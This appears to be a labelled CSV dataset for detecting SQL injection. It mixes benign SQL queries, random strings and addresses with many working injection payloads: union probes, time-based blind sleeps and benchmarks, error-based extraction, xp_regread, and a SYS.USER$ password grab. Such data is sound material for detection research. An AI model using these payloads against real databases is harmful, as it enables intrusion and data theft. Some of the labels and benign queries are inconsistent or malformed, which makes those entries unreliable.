Query,SELECT,UNION,OR,AND,Label
SELECT foreign ( s )  FROM expect,1,0,1,0,0
97228883v,0,0,0,0,0
SELECT AVG ( brother ) FROM each SELECT SUM ( sheet ) ,1,0,0,0,0
"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#",1,1,0,0,1
nela,0,0,0,0,0
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1,1,1,0,1
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",0,0,1,0,1
SELECT scientist ( s )  FROM shop SELECT author ( s ) ,1,0,1,0,0
SELECT AVG ( neck ) FROM leader,1,0,0,0,0
"   SELECT hand, cook+ ', ' + audience+ ' ' + main+ ', ' + avoid AS adventure  FROM acres",1,0,0,1,0
1'+  (  select smze where 5616  =  5616,1,0,0,0,1
54310177r,0,0,0,0,0
agote lledos,0,0,0,0,0
SELECT * FROM order WHERE naturally = 'winter' LIMIT 3,1,0,1,0,0
SELECT face FROM captured UNION SELECT environment FROM night ORDER BY frequently,1,1,1,0,0
boimorto,0,0,1,0,0
SELECT DISTINCT corner FROM shore,1,0,1,0,0
"  SELECT surprise AS dear, rest AS [yard]  FROM especially",1,0,0,0,0
SELECT COUNT ( boneID ) FROM blank,1,0,0,0,0
"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,0,0,1,1
SELECT * FROM particularly WHERE field BETWEEN up09/01/1996eat AND interest15/31/1996branch,1,0,0,1,0
"c/ las chumberas, 38,",0,0,0,0,0
SELECT * FROM collect WHERE newspaper BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
"avinguda guix borrull 170,",0,0,1,0,0
SELECT announced ( s )  FROM visit LEFT JOIN,1,0,0,0,0
waitfor delay '0:0:5' and   (  4614  =  4614,0,0,1,1,1
SELECT * FROM bound,1,0,0,0,0
-5547' or 9323  =  9323#,0,0,1,0,1
""" or sleep  (  __TIME__  )    =  """,0,0,1,0,1
"1%"" union all select null,null,null,null,null,null,null,null--",1,1,0,0,1
"SELECT * FROM return WHERE medicine BETWEEN ""darkness"" AND    ""guard""",1,0,0,1,0
SELECT * FROM sudden,1,0,0,0,0
"1'||  (  select 'ufgs' where 9670  =  9670 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",1,0,1,0,1
43713,0,0,0,0,0
"1'   )    )    as jpxj where 6153  =  6153 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,1,0,1
"   SELECT Employees.bound, COUNT ( Orders.thirdID )  AS mineralsFROM    ( OrdersINNER JOIN off ON Orders.theeID  =  Employees.minuteID ) ",1,0,1,0,0
1  )   where 7552  =  7552 order by 1#,0,0,1,0,1
1%' waitfor delay '0:0:5' and '%'  =  ',0,0,1,1,1
SELECT MIN ( repeat )  AS chemical FROM rain,1,0,0,0,0
SELECT TOP 50 PERCENT * FROM bean,1,0,0,0,0
" SELECT column_name ( s )  FROM speech,central",1,0,0,0,0
 group by userid having 1  =  1--,0,0,0,0,1
SELECT * FROM distance  WHERE former NOT LIKE '[attempt]%',1,0,1,0,0
SELECT * FROM listen WHERE without BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
1'   )    )    as qpai where 2619  =  2619,0,0,0,0,1
87053274e,0,0,0,0,0
"1',  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",1,0,0,0,1
"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1,1,0,0,1
21,0,0,0,0,0
SELECT * FROM across,1,0,0,0,0
SELECT * FROM scared FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
SELECT * FROM zulu 3 SELECT * FROM child,1,0,0,0,0
SELECT COUNT ( whenID ) FROM rubbed,1,0,0,0,0
"  SELECT ROUND ( 345.156,   0 ) ;",1,0,0,0,0
SELECT * FROM every WHERE crew BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
"do cotaredo, 147 9e",0,0,0,0,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  # huhw",0,0,0,0,1
SELECT * FROM lady ORDER BY positive,1,0,1,0,0
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",0,0,1,0,1
gaja,0,0,0,0,0
2el6s,0,0,0,0,0
SELECT COUNT ( certain ) FROM factory,1,0,1,0,0
SELECT * FROM term  WHERE driving NOT LIKE '[atmosphere]%',1,0,0,0,0
SELECT MIN ( mile )  AS class FROM careful,1,0,0,0,0
"  SELECT important AS add, particular AS [into]  FROM dull",1,0,1,0,0
SELECT Count ( * )  AS include,1,0,0,0,0
-6129  )   as vuze where 1565  =  1565 or   (  8459  =  8459  )  *4906--,0,0,1,0,1
hermanos barral 61,0,0,0,0,0
SELECT * FROM better WHERE gave = 'slipped',1,0,0,0,0
SELECT COUNT ( DISTINCT end )  FROM doctor,1,0,1,0,0
"1%""  )   union all select null,null,null,null,null,null,null--",1,1,0,0,1
1'+  (  select 'xqjx' where 7048  =  7048 and 9198  =  9198--,1,0,0,1,1
SELECT * FROM wp_posts WHERE ID  =  28072 LIMIT 1,1,0,0,0,0
SELECT * FROM bell WHERE sheep = 'accurate'  AND  ( steel = 'drive' OR column = 'mouth' ) ,1,0,1,1,0
santaren,0,0,0,0,0
SELECT compound ( s )  FROM press UNION,1,1,0,0,0
1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,0,0,1,1
SELECT * FROM also WHERE NOT research = 'system'  AND NOT basic = 'post',1,0,0,1,0
"1'+  (  select blbd where 7451  =  7451 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",1,0,1,1,1
SELECT bring ( s )  FROM alphabet LEFT JOIN,1,0,0,0,0
7uo09e5a1,0,0,0,0,0
SELECT * FROM country FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
SELECT AVG ( basic ) FROM belt SELECT SUM ( carefully ) ,1,0,0,0,0
"1"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,1,0,1
SELECT * FROM whatever WHERE lesson = 'temperature'  AND  ( tried = 'fighting' OR chapter = 'good' ) ,1,0,1,1,0
SELECT Count ( * )  AS skill,1,0,0,0,0
"  SELECT gold,men FROM quite WHERE learn = 'say' UNION SELECT personal, rear FROM damage",1,1,0,0,0
1 and 5934  =  7745,0,0,0,1,1
SELECT * FROM drop WHERE    NOT offer = 'conversation',1,0,0,0,0
"   SELECT question, barn, lieFROM current WHERE burst  IS NOT NULL",1,0,0,0,0
SELECT MIN ( am )  AS television FROM can,1,0,0,0,0
SELECT * FROM important WHERE hour = 'increase' LIMIT 3,1,0,1,0,0
musson@ajuntamentdebarcelona20.pr,0,0,0,0,0
SELECT * FROM pile 3,1,0,0,0,0
"1%'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",1,0,0,1,1
"-6626%""  )   or 1744  =  5292 and   (  ""%""  =  """,0,0,1,1,1
trevetha,0,0,0,0,0
06314426y,0,0,0,0,0
SELECT cloth FROM worry UNION SELECT certain FROM wooden ORDER BY young,1,1,1,0,0
1'   )    )    rlike   (  select   (  case when   (  8489  =  8820  )   then 1 else 0x28 end   )    )    and    (    (   'fbjf'  =  'fbjf,1,0,0,1,1
"SELECT column1 , column2, ... FROM table_name ORDER BY column1, column2, ... ASC|DESC;",1,0,1,0,0
telema,0,0,0,0,0
"1""  )   union all select null,null--",1,1,0,0,1
"  SELECT bentID AS ID, matter AS decide FROM second",1,0,0,0,0
44338,0,0,0,0,0
SELECT * FROM chamber WHERE discovery = 'short' LIMIT 3,1,0,1,0,0
SELECT AVG ( easier ) FROM story,1,0,1,0,0
golari,0,0,0,0,0
"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",1,1,0,0,1
"c/ ereta, 104,",0,0,0,0,0
SELECT * FROM  ( SELECT service FROM series ) ,1,0,0,0,0
"1"" and 5205  =  9975#",0,0,0,1,1
-2983'  )   or 8571  =  8571--,0,0,1,0,1
SELECT TOP 3 * FROM before,1,0,1,0,0
"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,0,1,0,1
" SELECT column_name ( s )  FROM pure,sound",1,0,0,0,0
"  SELECT eatID AS ID, all AS hot FROM earlier",1,0,0,0,0
SELECT * FROM several WHERE instance NOT BETWEEN 'lay' AND 'ran',1,0,0,1,0
SELECT * FROM pot WHERE attention = 'building',1,0,0,0,0
"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",1,0,0,1,1
"  SELECT equal,southern,trouble FROM hurry LEFT JOIN Orders ON fell.floorID =  headed.dust ORDER BY rope.heat",1,0,1,0,0
"c/ reina del cielo 136, 8-d",0,0,0,0,0
SELECT * FROM bare WHERE tomorrow BETWEEN bent09/01/1996improve AND clock15/31/1996musical,1,0,1,1,0
jose cadalso s/n 7d,0,0,0,0,0
"1  )   where 7571  =  7571 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,0,1,1
koichi,0,0,0,0,0
SELECT * FROM CustomersFETCH FIRST 3 ROWS ONLY;,1,0,0,0,0
SELECT COUNT ( especiallyID ) FROM mud,1,0,0,0,0
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""gknn"" like ""gknn",1,0,1,1,1
1'+  (  select 'fqkk' where 9725  =  9725,1,0,0,0,1
jernima,0,0,0,0,0
; exec xp_regread,0,0,0,0,1
"1"" where 4281  =  4281",0,0,0,0,1
SELECT Count ( * )  AS route,1,0,0,0,0
SELECT TOP 50 PERCENT * FROM cross,1,0,0,0,0
"SELECT WEEKOFYEAR ( ""2017-01-01"" ) ;",1,0,0,0,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3#",1,0,0,0,1
nuez de balboa 131 2-f,0,0,0,0,0
 or ''&',0,0,1,0,1
faada,0,0,0,0,0
SELECT * FROM  ( SELECT stock FROM driven ) ,1,0,0,0,0
guinee@misanimalesdomesticos.jp,0,0,0,0,0
"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,1,0,1
"-9684"" order by 1#",0,0,1,0,1
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",0,0,0,1,1
roe,0,0,0,0,0
SELECT region ( s ) FROM aware INNER JOIN,1,0,0,0,0
"1%"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1,0,0,1,1
-8112'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'xopg'  =  'xopg,1,0,1,1,1
SELECT Count ( * )  AS is,1,0,0,0,0
SELECT * FROM teacher WHERE half IN  ( SELECT balance FROM prepare ) ,1,0,0,0,0
"SELECT * FROM heavy WHERE part BETWEEN ""deer"" AND    ""eleven""",1,0,0,1,0
SELECT * FROM easy 3 SELECT * FROM look,1,0,0,0,0
2651,0,0,0,0,0
"1""  )   as uorp where 7208  =  7208",0,0,1,0,1
select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0,0,0,1
"1%""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""%""  =  """,1,0,1,1,1
SELECT bat ( s )  FROM wise SELECT leaving ( s ) ,1,0,0,0,0
7.79828E+15,0,0,0,0,0
"1""   )    )    as nlgn where 3834  =  3834 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,0,1,1
7770,0,0,0,0,0
SELECT gently ( s ) FROM inside INNER JOIN,1,0,0,0,0
SELECT AVG ( our ) FROM wise SELECT SUM ( outer ) ,1,0,0,0,0
SELECT officer FROM garden UNION SELECT full FROM obtain ORDER BY captain,1,1,1,0,0
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",1,1,1,1,1
SELECT * FROM welcome,1,0,0,0,0
SELECT COUNT ( sunlight ) FROM talk,1,0,0,0,0
tracz,0,0,0,0,0
felipa,0,0,0,0,0
lemoine5@informatica2009.zr,0,0,1,0,0
2689,0,0,0,0,0
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'rozr' like 'rozr,0,0,0,1,1
"1""  )   as boeh where 2571  =  2571 union all select null#",1,1,0,0,1
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,1,0,0,1,1
SELECT * FROM calm WHERE past IN  ( SELECT system FROM develop ) ,1,0,0,0,0
"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",0,0,1,1,1
declare @q nvarchar   (  200  )   0x730065006c00650063 ...,0,0,0,0,1
SELECT TOP 50 PERCENT * FROM realize,1,0,0,0,0
SELECT * FROM sea FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
"INSERT INTO shelter  ( third, disease, dance )  VALUES  ( 'cause', 'wrote', 'eight' )  ",0,0,0,0,0
"1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '",0,0,0,1,1
"-2111' union all select 1061,1061,1061--",1,1,0,0,1
SELECT any ( s )  FROM close UNION ALL,1,1,0,0,0
DELETE FROM Customers  WHERE CustomerName = 'Alfreds Futterkiste';,0,0,0,0,0
ubraco,0,0,0,0,0
1'+  (  select 'hplm' where 4008  =  4008 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,0,0,1,1
bernab,0,0,0,0,0
"-9922'   )    )    union all select 2193,2193,2193--",1,1,0,0,1
segura reygadas,0,0,0,0,0
nahuel,0,0,0,0,0
crovetto roger,0,0,0,0,0
"1""   )    )    as hace where 8785  =  8785",0,0,0,0,1
hierros 161 10f,0,0,0,0,0
5.15574E+15,0,0,0,0,0
1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',1,0,1,1,1
"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",0,0,0,0,1
"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",1,1,0,0,1
SELECT * FROM avoid WHERE chamber = 'port'  OR learn = 'it',1,0,1,0,0
"   SELECT earlier, few+ ', ' + hospital+ ' ' + direction+ ', ' + rich AS arrow  FROM higher",1,0,0,0,0
"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",1,0,0,1,1
borrenes,0,0,1,0,0
"1%"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""%""  =  """,0,0,0,1,1
"calle godelleta, s/n",0,0,0,0,0
SELECT chemical ( s )  FROM offer UNION,1,1,0,0,0
chaddie,0,0,0,0,0
"1""  )   where 2367  =  2367",0,0,0,0,1
SELECT * FROM grew FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM weigh,1,0,0,0,0
brinton2@tartasconamor.lr,0,0,1,0,0
SELECT * FROM screen WHERE hide = 'invented' LIMIT 3,1,0,0,0,0
"1""  )   where 9656  =  9656 and sleep  (  5  )  --",0,0,0,1,1
SELECT * FROM wp_posts WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  ORDER BY wp_posts.post_title ASC,1,0,1,1,0
SELECT * FROM list WHERE tin = 'toy',1,0,0,0,0
1 where 1576  =  1576,0,0,0,0,1
SELECT * FROM fly FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
"1%""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",0,0,0,1,1
falicov,0,0,0,0,0
SELECT excitement FROM lunch UNION ALL SELECT human FROM ride ORDER BY leg,1,1,1,0,0
"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,1,0,1,1,1
SELECT easily ( s )  FROM earn UNION ALL,1,1,0,0,0
SELECT AVG ( grain ) FROM nine SELECT SUM ( kids ) ,1,0,0,0,0
"1"" where 1719  =  1719 and 7533  =  7533--",0,0,0,1,1
1n154c3602,0,0,0,0,0
1.22216E+15,0,0,0,0,0
SELECT AVG ( thee ) FROM language SELECT SUM ( friend ) ,1,0,0,0,0
SELECT earth ( s FROM national RIGHT JOIN,1,0,0,0,0
"1   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  5340  =  5340",1,0,1,1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,0,1,1,1
"1""   )    )     )   union all select null,null--",1,1,0,0,1
"select count  (  *  )   from generate_series  (  1,5000000   )    )   +'",1,0,0,0,1
"   SELECT Employees.vowel, COUNT ( Orders.batID )  AS engineFROM    ( OrdersINNER JOIN beauty ON Orders.tillID  =  Employees.pitchID ) ",1,0,1,0,0
 )    )    or pg_sleep  (  __TIME__  )  --,0,0,1,0,1
SELECT AVG ( attack ) FROM over,1,0,0,0,0
"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""dppw"" like ""dppw",1,0,0,1,1
"1"" and make_set  (  8403  =  8403,8899  )   and ""fqxr"" like ""fqxr",0,0,0,1,1
37110,0,0,0,0,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  '%'  =  '",1,0,0,1,1
SELECT * FROM amount WHERE but = 'greater' FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
"1  )   where 8691  =  8691 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,0,1,1,1
klaudt,0,0,0,0,0
-2625'   )    )    or 3038  =  3038,0,0,1,0,1
SELECT * FROM you WHERE railroad = 'damage' LIMIT 3,1,0,0,0,0
25938703q,0,0,0,0,0
detleff3,0,0,0,0,0
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1,1,0,0,1
desparpajo,0,0,0,0,0
tomono@esteticadayda.az,0,0,0,0,0
1'  )   where 5280  =  5280 and 4595  =  4595#,0,0,0,1,1
"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,0,0,1,1
1' where 6359  =  6359 and   (  3020  =  3020  )  *6703--,0,0,0,1,1
SELECT * FROM  ( SELECT newspaper FROM dead ) ,1,0,0,0,0
"   SELECT ants, farther, opposite FROM lack WHERE college  IS NULL",1,0,0,0,0
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'peyy'  =  'peyy",1,0,0,1,1
SELECT COUNT ( symbol ) FROM planned,1,0,0,0,0
88356550a,0,0,0,0,0
"   SELECT flow, stop+ ', ' + oxygen+ ' ' + temperature+ ', ' + trunk AS rise  FROM gulf",1,0,0,0,0
olmos de esgueva,0,0,0,0,0
"1""   )    )    as bovm where 5560  =  5560 union all select null,null,null,null,null,null,null#",1,1,0,0,1
SELECT * FROM entirely WHERE NOT bone = 'camp'  AND NOT compound = 'circle',1,0,0,1,0
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'aqdj'  =  'aqdj",0,0,0,1,1
tors,0,0,1,0,0
psklib,0,0,0,0,0
SELECT AVG ( swam ) FROM talk SELECT SUM ( today ) ,1,0,0,0,0
SELECT * FROM joined,1,0,0,0,0
SELECT TOP 50 PERCENT * FROM instrument SELECT * FROM news FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM electric,1,0,0,0,0
bilal,0,0,0,0,0
SELECT * FROM save WHERE    NOT hidden = 'root',1,0,0,0,0
-6449'   )    )    or 2590  =  2848,0,0,1,0,1
"-2601'  )   union all select 2866,2866,2866,2866,2866,2866--",1,1,0,0,1
1  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  3945  =  3945,1,0,0,1,1
SELECT TOP 3 * FROM gas WHERE recent = 'moon',1,0,0,0,0
" SELECT * FROM own ORDER BY highest, improve",1,0,1,0,0
SELECT * FROM scared WHERE push BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
SELECT AVG ( yesterday ) FROM love,1,0,0,0,0
lloros*o,0,0,1,0,0
"  SELECT children AS character, leg AS [coach]  FROM some",1,0,0,0,0
x' AND email IS NULL; --,0,0,0,1,1
gelogo,0,0,0,0,0
"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0,1,0,1
SELECT * FROM chemical WHERE might BETWEEN nor09/01/1996log AND zoo15/31/1996potatoes,1,0,1,1,0
mcguinness.clayburgh7@eldeseodepecar.gu,0,0,0,0,0
37329,0,0,0,0,0
nolberto,0,0,0,0,0
SELECT ruler ( s )  FROM liquid,1,0,0,0,0
SELECT Count ( * )  AS again,1,0,0,0,0
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,0,1,0,1
46624,0,0,0,0,0
"  SELECT Orders.memoryrID, Employees.slightly, Employees.rain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.westernID ORDER BY Orders.medicineID",1,0,1,0,0
"   SELECT late, dozen+ ', ' + rapidly+ ' ' + thumb+ ', ' + radio AS teeth  FROM develop",1,0,0,0,0
-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,1,0,1,1,1
